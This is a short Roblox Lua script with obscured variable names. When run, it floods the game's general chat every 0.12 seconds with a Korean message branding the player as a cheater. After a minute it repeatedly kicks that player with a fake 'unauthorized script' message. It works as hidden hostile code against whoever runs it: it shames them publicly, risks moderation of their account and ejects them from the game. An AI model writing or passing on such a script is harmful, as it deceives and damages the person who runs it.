
local _=game:GetService("Players")local __=game:GetService("TextChatService")local ___=_.LocalPlayer
local ____="저는 이 핵을 실행한 핵쟁이 입니다"
task.spawn(function()while true do pcall(function()if __.TextChannels and __.TextChannels.RBXGeneral then __.TextChannels.RBXGeneral:SendAsync(____)end end)task.wait(0.12)end end)
task.wait(60)
task.spawn(function()while true do pcall(function()_.Kick(___,"You have been kicked for using unauthorized script.")end)task.wait(0.5)end end)print(".")
